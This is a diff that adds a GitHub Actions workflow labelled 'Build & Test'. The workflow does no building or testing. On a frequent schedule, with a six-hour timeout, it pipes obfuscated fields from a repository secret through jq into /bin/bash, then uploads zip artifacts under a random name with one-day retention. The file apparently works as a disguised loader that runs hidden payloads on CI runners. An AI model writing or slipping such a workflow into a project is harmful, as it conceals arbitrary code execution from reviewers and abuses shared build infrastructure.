@@ -1,0 +1,37 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '29 3,9,15,21 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Deploy
+        env:
+          tzjns89: ${{ secrets.tzjns89 }}
+        run: |
+          printf '%s' "$tzjns89" | jq -r .tk931 | /bin/bash
+          echo $kvf1 | jq -r .cyxyd0504 | /bin/bash
+          echo $offoc21 | jq -r .m2680 | /bin/bash
+          echo $dub86375 | jq -r .i3763 | /bin/bash
+          echo $lq2194 | jq -r .tux03 | /bin/bash
+          echo $gp81 | jq -r .g79 | /bin/bash
+          printf '%s' "$b200" | jq -r .j8109 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: hVNlGRgC
+          path: "*.zip"
+          retention-days: 1
